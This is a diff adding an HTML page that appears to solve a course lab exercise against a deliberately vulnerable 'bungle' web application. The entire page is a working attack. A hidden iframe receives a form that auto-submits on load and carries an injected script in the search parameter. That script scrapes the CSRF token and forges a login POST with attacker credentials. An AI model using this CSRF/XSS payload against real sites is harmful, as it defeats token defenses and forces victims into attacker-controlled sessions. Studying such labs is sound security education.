@@ -1,0 +1,16 @@
+<html>
+    <body>
+        <iframe style="display:none" name="invisible">
+        <!--<iframe name="invisible">-->
+        </iframe>
+        <!--<script src="https://cdn.bootcss.com/jquery/3.5.1/jquery.min.js"></script>-->
+
+
+        <form action="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0" method="GET", id='mf', target='invisible'>
+            <input type="hidden" name="q" value="<script>$.get('./?csrfdefense=1&xssdefense=0',function(data){ data=data.split('csrf_token')[1].split('>')[0].slice(9,-1);var xhr = new XMLHttpRequest();xhr.open('POST', '/login', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');var to_send='csrf_token='+data+'&username=attacker&password=l33th4x';xhr.send(to_send);});</script>" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
